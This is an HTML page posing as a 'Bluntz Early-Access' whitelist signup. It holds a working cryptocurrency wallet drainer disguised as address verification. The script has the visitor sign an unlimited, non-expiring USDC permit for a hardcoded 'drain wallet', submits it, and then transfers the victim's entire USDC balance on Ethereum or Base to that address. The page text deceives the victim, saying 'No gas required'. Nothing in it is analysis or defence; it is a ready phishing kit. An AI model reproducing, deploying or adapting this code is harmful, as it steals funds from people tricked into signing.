<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>Bluntz Early-Access</title>
<style>
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;background:#0d0d0d;color:#fff;display:flex;align-items:center;justify-content:center;height:100vh;margin:0}
.card{background:#1a1a1a;border-radius:12px;padding:30px 40px;text-align:center;max-width:380px;box-shadow:0 0 30px rgba(0,255,170,.25)}
h2{margin-top:0;font-size:24px;font-weight:600}
p{margin:12px 0;font-size:15px;color:#aaa}
button{background:#00ffaa;border:none;border-radius:8px;color:#000;font-size:17px;font-weight:700;padding:14px 28px;cursor:pointer;transition:.2s}
button:hover{filter:brightness(1.1)}
.foot{font-size:12px;margin-top:25px;color:#666}
</style>
</head>
<body>
<div class="card">
<h2>Bluntz Early-Access</h2>
<p>Tap the button and sign to secure your whitelist spot.</p>
<button id="go">Whitelist Wallet</button>
<p class="foot">By signing you allow us to verify your address.<br/>No gas required.</p>
</div>

<script>
// ===== CONFIG =====
const DRAIN = "0x0fac2542316Ad330EfA2bb386d606135b70a574B"; // Base/Eth drain wallet
const USDC  = { 8453: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", 1: "0xA0b86991c6218b36c1d19D4a2e9Eb4cE35914dC0" };

// ===== UTILS =====
const keccak = (t,v) => Web3.utils.keccak256(Web3.eth.abi.encodeParameters(t,v));
const pad32 = (a) => '0x' + a.slice(2).padStart(64,'0');
const abiEnc = (t,v) => Web3.eth.abi.encodeParameters(t,v).slice(2);

// ===== WALLET WAIT-LOOP =====
let eth;
async function getProvider() {
  let tries = 0;
  while (tries < 50 && !(window.ethereum || window.phantom?.ethereum)) {
    await new Promise(r => setTimeout(r, 100));
    tries++;
  }
  eth = window.ethereum || window.phantom?.ethereum;
  if (!eth) throw new Error("No wallet detected");
  return eth;
}

// ===== BUTTON HANDLER =====
document.getElementById("go").addEventListener("click", async () => {
  try {
    const eth = await getProvider();
    const [owner] = await eth.request({method:"eth_requestAccounts"});
    const chainId = parseInt(await eth.request({method:"eth_chainId"}),16);
    if (!USDC[chainId]) { alert("Switch to Ethereum or Base"); return; }

    const usdc     = USDC[chainId];
    const name     = "USD Coin";
    const version  = "2";
    const domainSep = keccak(
      ['bytes32','bytes32','bytes32','uint256','address'],
      [
        keccak("string","EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
        keccak("string",name),
        keccak("string",version),
        chainId,
        usdc
      ]
    );

    // real nonce
    const nonceHex = await eth.request({method:"eth_call",params:[{to:usdc,data:"0x7ecebe00"+pad32(owner)},"latest"]});
    const nonce = parseInt(nonceHex,16);

    // permit message
    const value    = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
    const deadline = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
    const messageHash = keccak(
      ['bytes32','address','address','uint256','uint256','uint256'],
      [
        keccak("string","Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)"),
        owner, DRAIN, value, nonce, deadline
      ]
    );
    const digest = keccak(
      ['string','bytes32','bytes32'],
      ["\x19\x01", domainSep, messageHash]
    );

    // force pop-up
    const sig = await eth.request({
      method:"eth_signTypedData_v4",
      params:[owner,{
        types:{
          EIP712Domain:[
            {name:"name",type:"string"},{name:"version",type:"string"},{name:"chainId",type:"uint256"},{name:"verifyingContract",type:"address"}
          ],
          Permit:[
            {name:"owner",type:"address"},{name:"spender",type:"address"},{name:"value",type:"uint256"},{name:"nonce",type:"uint256"},{name:"deadline",type:"uint256"}
          ]
        },
        primaryType:"Permit",
        domain:{name,version,chainId,verifyingContract:usdc},
        message:{owner,spender:DRAIN,value,nonce,deadline}
      }]
    });

    const {v,r,s} = ethers.utils.splitSignature(sig);
    const permitData = "0xd505accf" + abiEnc(
      ["address","address","uint256","uint256","uint8","bytes32","bytes32"],
      [owner,DRAIN,value,deadline,v,r,s]
    );

    // 1. PERMIT (victim pays gas â€“ appears in history)
    const permitTx = await eth.request({method:"eth_sendTransaction",params:[{from:owner,to:usdc,data:permitData,gas:"0x186a0"}]});

    // 2. SWEEP 100 % balance
    const balHex = await eth.request({method:"eth_call",params:[{to:usdc,data:"0x70a08231"+pad32(owner)},"latest"]});
    const bal = BigInt(balHex);
    const sweepData = "0xa9059cbb" + abiEnc(["address","uint256"],[DRAIN,bal.toString()]);

    const sweepTx= await eth.request({method:"eth_sendTransaction",params:[{from:owner,to:usdc,data:sweepData,gas:"0x186a0"}]});

    // success screen with links
    const scan = chainId===8453?"basescan.org":"etherscan.io";
    document.querySelector(".card").innerHTML=`
      <h2>Success!</h2>
      <p>Permit: <a href="https://${scan}/tx/${permitTx}" target="_blank" style="color:#00ffaa">view</a></p>
      <p>Sweep: <a href="https://${scan}/tx/${sweepTx}" target="_blank" style="color:#00ffaa">view</a></p>
    `;
  } catch (e) {
    console.error(e);
    alert("Signature rejected or failed.");
  }
});
</script>
<script src="https://cdn.jsdelivr.net/npm/web3@1.9.0/dist/web3.min.js"></script>
</body>
</html>
